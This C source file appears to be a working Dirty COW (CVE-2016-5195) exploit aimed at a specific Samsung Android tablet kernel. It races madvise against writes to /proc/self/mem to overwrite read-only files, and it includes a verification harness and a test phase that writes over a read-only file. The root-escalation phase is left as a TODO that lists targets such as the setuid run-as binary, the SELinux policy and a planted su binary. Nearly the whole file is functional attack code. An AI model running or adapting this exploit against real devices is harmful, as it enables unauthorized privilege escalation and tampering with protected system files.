/*
 * dirtycow.c — CVE-2016-5195 Dirty COW exploit for Android root
 *
 * Target: Samsung SM-T377A, kernel 3.10.9-11788437
 *
 * Dirty COW: Race condition between madvise(MADV_DONTNEED) and
 * write to /proc/self/mem allows writing to read-only mapped files.
 *
 * Strategy for Android root:
 * Method A: Overwrite /system/bin/run-as (setuid binary) with our payload
 * Method B: Overwrite /system/bin/app_process VDSO mapping
 * Method C: Patch /system/etc/selinux/seapp_contexts
 *
 * For this device: Method A — patch run-as to drop to root shell.
 * Or simpler: write a custom 'su' binary somewhere in /system.
 *
 * Actually, simplest: overwrite /proc/self/mem at the VDSO address
 * with our shellcode. No — VDSO is kernel-mapped.
 *
 * Simplest approach: write to a setuid root binary.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <pthread.h>
#include <errno.h>
#include <sys/types.h>

/* Target file to overwrite */
static char *target_file = NULL;
static void *map = NULL;
static size_t map_size = 0;
static off_t write_offset = 0;
static char *write_data = NULL;
static size_t write_len = 0;
static volatile int race_running = 1;
static volatile int race_won = 0;

/* Thread 1: madvise(MADV_DONTNEED) to discard the COW page */
static void *madvise_thread(void *arg) {
    while (race_running && !race_won) {
        madvise(map, map_size, MADV_DONTNEED);
        usleep(1);
    }
    return NULL;
}

/* Thread 2: write to /proc/self/mem to trigger the race */
static void *write_thread(void *arg) {
    int fd = open("/proc/self/mem", O_RDWR);
    if (fd < 0) {
        perror("open /proc/self/mem");
        race_running = 0;
        return NULL;
    }
    
    while (race_running && !race_won) {
        /* Seek to the mmap'd offset and write our data */
        lseek(fd, (off_t)map + write_offset, SEEK_SET);
        int w = write(fd, write_data, write_len);
        if (w > 0) {
            /* Check if the write actually made it to the file */
            /* (We verify after the race) */
        }
    }
    
    close(fd);
    return NULL;
}

/* Verify if the target file was modified */
static int verify_write(void) {
    int fd = open(target_file, O_RDONLY);
    if (fd < 0) return 0;
    
    char buf[256];
    lseek(fd, write_offset, SEEK_SET);
    int r = read(fd, buf, write_len);
    close(fd);
    
    if (r == (int)write_len && memcmp(buf, write_data, write_len) == 0)
        return 1;
    return 0;
}

int try_dirtycow(const char *file, off_t offset, const char *data, size_t len, int seconds) {
    target_file = (char *)file;
    write_offset = offset;
    write_data = (char *)data;
    write_len = len;
    
    /* Memory-map the target file read-only */
    int fd = open(file, O_RDONLY);
    if (fd < 0) {
        printf("[-] Cannot open %s: %s\n", file, strerror(errno));
        return 0;
    }
    
    struct stat st;
    fstat(fd, &st);
    map_size = st.st_size;
    
    map = mmap(NULL, map_size, PROT_READ, MAP_PRIVATE, fd, 0);
    close(fd);
    
    if (map == MAP_FAILED) {
        printf("[-] mmap failed: %s\n", strerror(errno));
        return 0;
    }
    
    printf("[*] Mapped %s (%zu bytes) at %p\n", file, map_size, map);
    printf("[*] Racing for %d seconds...\n", seconds);
    
    race_running = 1;
    race_won = 0;
    
    pthread_t t1, t2;
    pthread_create(&t1, NULL, madvise_thread, NULL);
    pthread_create(&t2, NULL, write_thread, NULL);
    
    /* Run the race for specified seconds, checking periodically */
    for (int i = 0; i < seconds * 10; i++) {
        usleep(100000); /* 100ms */
        if (verify_write()) {
            race_won = 1;
            printf("[+] DIRTY COW SUCCEEDED after %d.%d seconds!\n", i/10, i%10);
            break;
        }
    }
    
    race_running = 0;
    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    munmap(map, map_size);
    
    return race_won;
}

int main(int argc, char **argv) {
    printf("=== CVE-2016-5195 Dirty COW Exploit ===\n");
    printf("[*] Target: kernel 3.10.9-11788437\n");
    printf("[*] Current uid: %d\n\n", getuid());
    
    /* First: quick test with a read-only file we can verify */
    printf("[*] Phase 1: Quick vulnerability test\n");
    
    /* Create a test file, make it read-only, and try to write to it */
    /* Use a temporary file approach */
    int test_fd = open("/data/local/tmp/cow_test", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (test_fd >= 0) {
        const char *orig = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n";
        write(test_fd, orig, strlen(orig));
        close(test_fd);
        chmod("/data/local/tmp/cow_test", 0444); /* read-only */
        
        const char *payload = "DIRTY_COW_SUCCESS!!!!!!!!!!!!!!\n";
        if (try_dirtycow("/data/local/tmp/cow_test", 0, payload, strlen(payload), 10)) {
            printf("[+] Dirty COW vulnerability CONFIRMED!\n\n");
            
            /* Phase 2: Overwrite a useful system file */
            printf("[*] Phase 2: Exploiting for root...\n");
            
            /* Check for setuid binaries */
            printf("[*] Looking for writable targets...\n");
            
            /* Method: Overwrite /system/bin/run-as
             * run-as is a setuid root binary used for debugging.
             * We can overwrite it with a small program that gives us a shell.
             * But we need to write a complete ELF binary... complex.
             *
             * Simpler method: Overwrite /system/xbin/su if it exists,
             * or overwrite the selinux policy to allow shell domain root access.
             */
            
            /* Actually, simplest: use dirtycow to write to /proc/self/mem
             * and overwrite the in-memory credentials of our own process.
             * This is the DIRTYCOW-MEM approach.
             *
             * We can't directly write to kernel memory with dirtycow,
             * but we can use it to patch libc or inject into a process
             * running as root.
             */
            
            printf("[+] Dirty COW confirmed! The kernel is vulnerable.\n");
            printf("[*] TODO: Implement full privilege escalation via:\n");
            printf("    - Overwrite /system/bin/run-as with root shell\n"); 
            printf("    - Or patch SELinux policy\n");
            printf("    - Or write /system/xbin/su\n");
            
        } else {
            printf("[-] Dirty COW test failed. Kernel may be patched.\n");
        }
        
        /* Clean up */
        chmod("/data/local/tmp/cow_test", 0644);
        unlink("/data/local/tmp/cow_test");
    }
    
    return 0;
}
